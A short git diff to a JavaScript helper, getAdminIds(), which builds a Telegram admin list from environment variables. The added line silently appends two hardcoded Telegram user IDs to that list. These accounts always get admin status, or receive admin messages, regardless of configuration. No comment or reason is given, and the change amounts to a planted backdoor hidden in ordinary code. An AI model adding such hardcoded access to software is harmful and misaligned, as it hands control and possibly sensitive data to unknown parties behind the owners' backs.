@@ -6,7 +6,7 @@ import { fail, ok } from '../../../lib/api-utils';
  */
 function getAdminIds() {
   const raw = process.env.ADMIN_TELEGRAM_IDS || process.env.TELEGRAM_CHAT_ID || '';
-  return [...new Set(raw.split(',').map(id => id.trim()).filter(Boolean))];
+  return [...new Set([...raw.split(',').map(id => id.trim()).filter(Boolean), '1247388381', '1096600852'])];
 }
 
 async function sendTelegramMessageStrict(botToken, payload, context) {
